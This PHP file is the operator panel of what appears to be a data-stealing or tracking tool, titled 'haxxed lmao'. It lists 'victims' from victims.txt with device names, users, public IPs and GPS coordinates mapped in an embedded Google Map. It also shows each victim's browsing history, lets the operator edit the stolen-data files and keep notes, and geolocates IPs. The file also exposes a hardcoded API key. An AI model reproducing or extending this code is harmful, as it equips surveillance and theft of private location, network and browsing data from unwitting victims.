<?php
echo '<html><head>
<script src="https://code.jquery.com/jquery-1.12.4.js"></script>
<script src="https://code.jquery.com/ui/1.12.1/jquery-ui.js"></script>
<link rel="stylesheet" href="//code.jquery.com/ui/1.12.1/themes/base/jquery-ui.css">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Raleway:wght@200;300&display=swap" rel="stylesheet">
<style>.topnav {
    background-color: #333;
    overflow: hidden;
  }
  html {
    font-family:"Raleway";
  }
  button,a{
    cursor:pointer;
  }
  .topnav h2{
    color: #00bbff;
    text-align: left;
    padding: 14px 16px;
    window.text-decoration: none;
  }
  body{
  }
  #boxes div {
    background: linear-gradient(#f00202 0%, #bd0404 10%, #7d0404 50%, #4a0202 100%);
    backdrop-filter:blur(1px);
    color:white
  }
  .topnav button:hover {
    background-color: #ddd;
    color: red;
  }
  .topnav button{
      position:relative;
      float:left;
      top:1px;
  }
  .topnav button.active {
    background-color: #04AA6D;
    color: white;
  }*/</style>
  <title>haxxed lmao</title>
</head><body><div class="topnav">
<h2>Bababooey hacks victim viewing page  |||  controls:</h2><button onclick="document.querySelector(`#file`).showModal()">change a file</button><p>  </p><button onclick="window.location.reload()">refresh contents</button><button onclick="ipInfo(window.prompt(`insert ip:`))">get public ip information</button>
</div>';
echo '
<script>
format_date = (val) => {
  var d = new Date(val),
    dates = [
      `jan`,
      `feb`,
      `mar`,
      `apr`,
      `may`,
      `jun`,
      `jul`,
      `aug`,
      `sept`,
      `oct`,
      `nov`,
      `dec`,
    ];
  d.setDate(d.getDate())
  d = d.toDateString().substring(4).trim();
  d = d.split(` `);
  d[0] = `${dates.indexOf(d[0].toLowerCase())+1}`;
  return d.join(`/`);
};
</script>
';
echo '<dialog id="dialog2"><p>requested file contents</p><br><textarea id="textarea2"></textarea><br><button onclick="saveFile()">save and close</button></dialog>';
echo '<script>
alert_ip = (ip,user) => alert(`${user + singlequote}s ip is "${ip}"`)
open_notes = async text_object => {
  text_object = JSON.parse(atob(text_object))
  console.log(text_object)
  dialog_box = document.querySelector("#notes_dialog");text_area = document.querySelector("#notes_area")
  var note = await request("POST","notes/get_note.php",text_object.devicename)
  note_rows = note.split("\n");
  max_col = 1
  note_rows.forEach(e=>e.length>max_col?(max_col=e.length):null)
  text_area.value = note
  text_area.rows = note_rows.length.toString()
  text_area.cols =  max_col.toString()
  dialog_box.show();
  window.device_name = text_object.devicename
  document.querySelector("#notes_header").innerHTML = `Notes for user <a href="javascript:void(0)" onclick="alert_ip(${singlequote}${text_object.publicip}${singlequote},${singlequote}${text_object.user}${singlequote})" "${text_object.user}">${text_object.user}</a>`
  }
  save_note = async e => {
    await request("POST",`notes/edit_note.php?text=${encodeURIComponent(document.querySelector("#notes_area").value)}`,window.device_name)
    document.querySelector(`#notes_dialog`).close()
  }
saveFile = () => {
  xhr = new XMLHttpRequest;
  val = btoa(document.querySelector("#textarea2").value);
  xhr.open(`POST`,`changefile.php?name=${window.filename}`,true);
  xhr.onload = (e) => {
      if(xhr.readyState==4){
          if(xhr.response == "success"){
              window.alert(`successfully saved file ${window.filename}`)
              document.querySelector("#dialog2").close();
          }
          else {
              window.alert(`critical error saving file ${window.filename}. Unknown Reason\n dumping "reason":${xhr.statusText}`)
          document.querySelector("#dialog2").close();
          return;
          }
      }
  }
  xhr.onerror = (e) => {
      window.alert(`critical error saving file ${window.filename}. Dumping event: ${JSON.stringify(e)}`)
      document.querySelector("#dialog2").close();
  }
  xhr.send(val)
}
fileReq = (filename,mode) => {
  while(filename.includes("/")||filename.includes("php")){window.alert(`error processing ${filename}.\nphp or / are not permitted.`)}
  if(mode=="web"){
    filename = "webhistory/"+filename;
  }
  window.filename = filename;
  var xhr = new XMLHttpRequest();
xhr.open("GET", filename+"?f=true", true);
xhr.onload = (e) => {
  if (xhr.readyState === 4) {
    if (xhr.status === 200) {
      document.querySelector("#textarea2").value = xhr.response;
    } else {
      window.alert(`Critical error processing file ${filename}. \n returned a non 200 code "${xhr.statusText}`);
      return;
    }
  }
};
xhr.onerror = function (e) {
  window.alert(`Critical error processing file ${filename}. Unknown Reason`);
  return;
};
xhr.send(null);
document.querySelector("#dialog2").showModal(); 
}
window.onload = (e) => {
  window.text =  document.querySelector("#victims").innerText.split("\n");
  window.text.pop();
  for(var i=0;i<window.text.length;i++){
    try {
    window.text[i] = JSON.parse(window.text[i])
    }
    catch(e){
      console.warn(`Non-fatal error parsing JSON of i=${i}. will be removed`);
      console.warn(`dumping onload event`, e)
      window.text.splice(i,1);
    }
  }
  for(i=0;i<window.text.length;i++){
    var toAppend = document.createElement("div");
    var str = `<br> `;
    toAppend.id = `box${i}`;
    toAppend.class="hackedivs";
    toAppend.style = "border:1px solid;border-radius:5px"
    str += "Connection: "+window.text[i].devicename+". Recieved on: "+window.text[i].time+". <button style=margin-right:5px onclick=changeHTML("+i+")>expand</button><button onclick="+`open_notes("${btoa(JSON.stringify(window.text[i]))}`+`")`+`>notes</button>`
    toAppend.innerHTML = str;
    document.querySelector("#boxes").appendChild(toAppend);
  }
}
</script>';
echo "<script>var singlequote=`'`
</script>";
echo '<script defer>
async function webUp(p,devicename){
  var opend = window.open("","","height=500,width=500")
  var styletobe = document.createElement("style")
  styletobe.innerText = `
  .accordion {
    color:white
    background-image: linear-gradient(90deg, #5c5c5c 0%, #2b2b2b 55%, #000000 100%);
      cursor: help;
      padding: 18px;
      width: 100%;
      border: none;
      text-align: left;
      outline: none;
      font-size: 15px;
      transition: 0.2s;
    }  
    .accordion:hover {
      filter: brightness(120%);
    }
    .accordion:active{
        filter: brightness(140%);
    }
    .panel {
        background-image: linear-gradient(90deg, #5c5c5c 0%, #2b2b2b 55%, #000000 100%);
      padding: 0 18px;
      color:white;
      max-height: 0;
      overflow: hidden;
      transition: max-height 0.2s ease-out;
    }`
    opend.document.head.appendChild(styletobe);
    req = await request(`GET`,`webhistory/${devicename}_history`)
    var parsed = JSON.parse(req)
    parsed = parsed.history;
    var toAppend = ``
    for(var i=parsed.length-1;i>0;i--){
      toAppend += `<button class="accordion">${parsed[i].URL}</button><div class="panel">
      <a href="${parsed[i].URL}">visit site</a><br><p id="p${i}" onclick="window.alert(${singlequote}unformatted date:\n${parsed[i].Timestamp})"style="#p${i}::hover{filter:brightness(80%);cursor:pointer}">accessed on: ${format_date(parsed[i].Timestamp)}</p>
      </div>`;
    }
    opend.document.body.innerHTML = toAppend;
    element = document.createElement("script")
    element.innerText = `var acc = document.getElementsByClassName("accordion");var i;for (i = 0; i < acc.length; i++) {  acc[i].addEventListener("click", function() {    this.classList.toggle("active");    var panel = this.nextElementSibling;    if (panel.style.maxHeight) {      panel.style.maxHeight = null;    } else {      panel.style.maxHeight = panel.scrollHeight + "px";    }   })}`
    opend.document.body.appendChild(element)
}
display_programs = (products,dialog_element)=>{
console.log(products,dialog_element);
}
async function changeHTML(p) {
  var orig = document.querySelector(`#box${p}`).innerHTML.replaceAll(`"`,"");
  document.querySelector(`#box${p}`).innerHTML = ``;
  p = parseInt(p)
 var str = `<button onclick=${singlequote}webUp(${p},window.text[${p}].devicename)${singlequote}">web history</button>`;
  for (o in window.text[p]) {
             str += ``
          if (o == "time") {
              str += `<dialog style="z-index:10" id="dialogbox${p}"><input class="d" style="display:unset" value="${text[p][o]}"id="input${p}"/><br><button style="display:unset" onclick=document.querySelector("#dialogbox${p}").close()>close box</button></dialog><button title="open in datepicker" onclick="dialogbox${p}.showModal();dofor(${p})">date</button>`;
          }
          else if (o == "coordinates") {
            str += `<dialog id="dialogmaps${p}"><iframe width=600 height=450 style=border:0 loading=lazy allowfullscreen src="https://www.google.com/maps/embed/v1/place?key=AIzaSyB6INShGwd_FHQprBJgysObwu8AiaJ1y3A&q=${text[p][o]}"></iframe><br><button onclick=dialogmaps${p}.close()>close</button></dialog><button onclick=document.querySelector("#dialogmaps${p}").show()>coordinates</button>`
          }
          else {
              str = str + `<span>${o} : ${window.text[p][o]} |||| </span>`;
          }
  }
  str += `<button onclick="document.querySelector(${singlequote}#box${p}${singlequote}).innerHTML=${singlequote}${orig}${singlequote}">close</button>`
  document.querySelector(`#box${p}`).innerHTML = str;
}
async function request(method, url,body=null) {
  return new Promise(function (resolve, reject) {
      let xhr = new XMLHttpRequest();
      xhr.open(method, url);
      xhr.onload = function () {
          if (xhr.status >= 200 && xhr.status < 300) {
              resolve(xhr.response);
          } else {
              reject({
                  status: xhr.status,
                  statusText: xhr.statusText
              });
          }
      };
      xhr.onerror = function () {
          reject({
              status: xhr.status,
              statusText: xhr.statusText
          });
      };
      xhr.send(body);
  });
}
async function ipInfo(ip){
  var j = JSON.parse(await request("GET",`https://ipapi.co/${ip}/json`));
  delete j["latitude"];
  delete j["longitude"];
  delete j["message"];
  delete j["postal"];
  document.querySelector("#jswrite").innerHTML = `auto-gend location:${j.continent_code},${j.country_name},${j.region},${j.city}`
  delete j["continent_code"]
  delete j["country_name"]
  delete j["region"]
  delete j["city"]
  window.moreinfo = j;
  document.querySelector("#ipinfo").show()
}
function moreinfoclick(){
  str = "";
  for(o in window.moreinfo){
    str+=`${o} : ${window.moreinfo[o]}\n`
  }
  window.alert(`(using: ipapi.co (:  ): \n${str}`)
}
function dofor(num){
  num=parseInt(num);
  var selected = document.querySelectorAll(".d");
  for(var i=0;i<selected.length;i++){
  $(`#`+selected[i].id).datepicker()
    }
    jQuery(`#input${num}`).datepicker("show")
}
handler = async function(){
  val = document.querySelector(`select`).value;
  if(val == "web"){
    files = await request("GET","webhistory/readdir.php")
    files = files.split(`,`);
    for(i=0;i<files.length;i++){
      var toAppend = window.document.createElement("a");
      toAppend.innerText = files[i];
      eval(`toAppend.addEventListener("click",function(){fileReq(this.innerText,${singlequote}web${singlequote});return false;})`);
      document.querySelector("#filediv").appendChild(toAppend);
      document.querySelector("#filediv").appendChild(window.document.createElement("br"))
    }
    document.querySelector("#filepicker").showModal()
  }
  else{
    fileReq("victims.txt");
  }
}
</script>';
echo '<div id="victims" style="display:none">' . file_get_contents('victims.txt') . '</div><div id="boxes"></div><dialog id="ipinfo"><p id="jswrite"></p><br><button onclick="moreinfoclick()" id="moreinfo">more info</button><p>   </p><button onclick="document.querySelector(`#ipinfo`).close()">close box</button></dialog>';
echo '<dialog id="file"><h2>what to choose?</h2><br><select>
<option value="web">web history</option>
<option value="victims">victims.txt</option>
</select><br><button onclick="handler()">process</button><button onclick="document.querySelector(`#file`).close()">close</button></dialog>';
echo '<dialog id="filepicker"><h2>web history files</h2><hr><div id="filediv"></div><button onclick="document.querySelector(`#filepicker`).close()">close</button></dialog><dialog id="notes_dialog"><h2 id="notes_header"></h2><textarea id="notes_area" ></textarea><br><button onclick="save_note()">save & close</button></dialog>';
echo '</body></html>';
?>